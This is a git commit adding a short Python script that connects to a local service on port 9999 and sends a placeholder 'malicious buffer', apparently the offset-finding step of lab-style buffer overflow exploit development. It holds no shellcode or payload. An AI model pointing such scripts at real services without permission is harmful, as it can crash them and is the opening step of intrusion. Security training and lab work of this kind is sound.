ccce2c23e663dcecb775d2f85a0138c7da16ef37
F1uffyGoat <43916815+F1uffyGoat@users.noreply.github.com>
2019-04-10 22:47:09 +0200

    Create simple-buffer-overflow.py
    simple buffer overflow test script handy for pattern_create strings to determine pattern_offset

---
+++ simple-buffer-overflow.py
@@ -0,0 +1,17 @@
+#!/usr/bin/python
+
+import socket
+
+buffer="insert pattern_create string here"
+
+
+s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+    print "\nSending malicious buffer...."
+    s.connect(('127.0.0.1', 9999))
+    data = s.recv(1024)
+    s.send(buffer + '\r\n')
+    print "\nOverflowefed"
+except:
+    print "could not connect to application"
